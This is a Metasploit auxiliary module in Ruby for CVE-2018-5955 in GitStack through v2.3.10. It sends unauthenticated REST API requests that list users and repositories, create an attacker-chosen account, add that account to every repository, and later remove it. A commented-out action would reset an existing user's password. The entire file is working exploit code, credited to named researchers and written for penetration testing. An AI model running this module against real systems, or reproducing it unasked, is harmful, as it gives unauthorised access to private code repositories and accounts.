##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'GitStack Unauthenticated REST API Requests',
      'Description'  => %q{
        This modules exploits unauthenticated REST API requests in GitStack through v2.3.10.
        The module supports requests for listing users of the application and listing
        available repositories. Additionally, the module can create a user and add the user
        to the application's repositories. This module has been tested against GitStack v2.3.10.
      },
      'Author'       =>
        [
          'Kacper Szurek',  # Vulnerability discovery and PoC
          'Jacob Robles'    # Metasploit module
        ],
      'License'      => MSF_LICENSE,
      'References'   =>
        [
          ['CVE', '2018-5955'],
          ['EDB', '43777'],
          ['EDB', '44044']
        ],
      'DisclosureDate' => 'Jan 15 2018',
      'Actions'       =>
        [
          [
            'LIST',
            {
              'Description' => 'List application users',
              'List'      => 'GET',
              'UserPath'    => '/rest/user/'
            }
          ],
          [
            'CREATE',
            {
              'Description' => 'Create a user on the application',
              'Create'      => 'POST',
              'List'        => 'GET',
              'UserPath'    => '/rest/user/',
              'RepoPath'    => '/rest/repository/'
            }
          ],
          # If this is uncommented, you will be able to change an
          # existing user's password.
          # After modifying the user's password, the user will be
          # added to all available repositories.
          # The cleanup action removes the user from all repositories
          # and then deletes the user... so this action may not be desirable.
          #[
            #'MODIFY',
            #{
              #'Description' => "Change the application user's password",
              #'Create'      => 'PUT',
              #'List'        => 'GET',
              #'UserPath'    => '/rest/user/',
              #'RepoPath'    => '/rest/repository/'
            #}
          #],
          [
            'LIST_REPOS',
            {
              'Description' => 'List available repositories',
              'List'      => 'GET',
              'RepoPath'    => '/rest/repository/'
            }
          ],
          [
            'CLEANUP',
            {
              'Description' => 'Remove user from repositories and delete user',
              'List'        => 'GET',
              'Remove'      => 'DELETE',
              'RepoPath'    => '/rest/repository/',
              'UserPath'    => '/rest/user/'
            }
          ]
        ],
      'DefaultAction' => 'LIST'))

    register_options(
      [
        OptString.new('USERNAME', [false, 'User to create or modify', 'msf']),
        OptString.new('PASSWORD', [false, 'Password for user', 'password'])
      ])
  end

  def get_users
    path = action.opts['UserPath']
    begin
      res = send_request_cgi({
        'uri'     =>  path,
        'method'  =>  action.opts['List']
      })
    rescue Rex::ConnectionError, Errno::ECONNRESET => e
      print_error("Failed: #{e.class} - #{e.message}")
      return
    end
    if res && res.code == 200
      begin
        mylist = res.get_json_document
        mylist -= ['everyone']
      rescue JSON::ParserError => e
        print_error("Failed: #{e.class} - #{e.message}")
        return
      end
      mylist.each do |item|
        print_good("#{item}")
      end
    end
  end

  def get_repos
    path = action.opts['RepoPath']
    begin
      res = send_request_cgi({
        'uri'     =>  path,
        'method'  =>  action.opts['List']
      })
    rescue Rex::ConnectionError, Errno::ECONNRESET => e
      print_error("Failed: #{e.class} - #{e.message}")
      return nil
    end
    if res && res.code == 200
      begin
        mylist = res.get_json_document
        return mylist
      rescue JSON::ParserError => e
        print_error("Failed: #{e.class} - #{e.message}")
        return nil
      end
    else
      return nil
    end
  end

  def clean_app
    user = datastore['USERNAME']
    unless user
      print_error("USERNAME required")
      return
    end

    mylist = get_repos
    if mylist
      # Remove user from each repository
      mylist.each do |item|
        path = "#{action.opts['RepoPath']}#{item['name']}/user/#{user}/"
        begin
          res = send_request_cgi({
            'uri'     =>  path,
            'method'  =>  action.opts['Remove']
          })
        rescue Rex::ConnectionError, Errno::ECONNRESET => e
          print_error("Failed: #{e.class} - #{e.message}")
          return
        end

        if res && res.code == 200
          print_good("#{res.body}")
        else
          print_status("User #{user} doesn't have access to #{item['name']}")
        end
      end
    end

    # Delete the user account
    path = "#{action.opts['UserPath']}#{user}/"
    begin
      res = send_request_cgi({
        'uri'     =>  path,
        'method'  =>  action.opts['Remove']
      })
    rescue Rex::ConnectionError, Errno::ECONNRESET => e
      print_error("Failed: #{e.class} - #{e.message}")
      return
    end

    # Check if the account was successfully deleted
    if res && res.code == 200
      print_good("#{res.body}")
    else
      print_error("#{res.body}")
    end
  end

  def add_user
    user = datastore['USERNAME']
    pass = datastore['PASSWORD']

    begin
      res = send_request_cgi({
        'uri'       =>  action.opts['UserPath'],
        'method'    =>  action.opts['Create'],
        'vars_post' =>  {
          'username'  =>  user,
          'password'  =>  pass
        }
      })
    rescue Rex::ConnectionError, Errno::ECONNRESET => e
      print_error("Failed: #{e.class} - #{e.message}")
      return
    end
    if res && res.code == 200
      print_good("SUCCESS: #{user}:#{pass}")
    else
      print_error("#{res.body}")
      return
    end

    mylist = get_repos
    if mylist
      mylist.each do |item|
        path = "#{action.opts['RepoPath']}#{item['name']}/user/#{user}/"
        begin
          res = send_request_cgi({
            'uri'     =>  path,
            'method'  =>  action.opts['Create']
          })
        rescue Rex::ConnectionError, Errno::ECONNRESET => e
          print_error("Failed: #{e.class} - #{e.message}")
          next
        end
        if res && res.code == 200
          print_good("#{res.body}")
        else
          print_error("Failed to add user")
          print_error("#{res.body}")
        end
      end
    else
      print_error("Failed to retrieve repository list")
    end
  end

  def run
    if ["LIST"].include?(action.name)
      print_status('Retrieving Users')
      get_users
    elsif ["LIST_REPOS"].include?(action.name)
      print_status('Retrieving Repositories')
      mylist = get_repos
      if mylist
        mylist.each do |item|
          print_good("#{item['name']}")
        end
      else
        print_error("Failed to retrieve repository list")
      end
    elsif ["CLEANUP"].include?(action.name)
      clean_app
    elsif datastore['USERNAME'] && datastore['PASSWORD']
      add_user
    else
      print_error("USERNAME and PASSWORD required")
    end
  end
end
